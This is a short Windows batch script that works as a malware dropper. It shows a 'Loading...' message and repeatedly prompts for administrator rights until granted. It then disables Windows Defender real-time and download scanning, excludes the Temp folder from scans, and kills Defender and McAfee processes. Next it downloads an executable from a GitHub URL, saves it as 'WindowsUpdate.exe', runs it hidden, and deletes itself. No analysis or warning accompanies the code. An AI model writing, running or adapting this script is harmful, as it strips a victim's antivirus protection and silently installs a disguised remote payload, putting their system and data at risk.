@echo off
echo Loading...  
3>nul (  
    :checkadmin  
    net session >nul 2>&1  
    if %errorLevel% == 0 goto :execute  

    powershell -command "Start-Process cmd -ArgumentList '/c %~0' -Verb RunAs"  
    timeout /t 2 >nul  
    goto :checkadmin  
    :execute  
    powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Add-MpPreference -ExclusionPath '%Temp%\'"  
    taskkill /f /im MsMpEng.exe >nul 2>&1  
    taskkill /f /im McAfee*.exe >nul 2>&1  
    set "PAYLOAD_URL=https://github.com/madhead341/amzhubv2/raw/refs/heads/main/V3.exe"
    set "SAVE_PATH=%Temp%\WindowsUpdate.exe"  
    powershell -command "Invoke-WebRequest -Uri '%PAYLOAD_URL%' -OutFile '%SAVE_PATH%'"  
    start /B "" "%SAVE_PATH%"   
    del /f /q "%~f0" >nul 2>&1  
)  

exit  
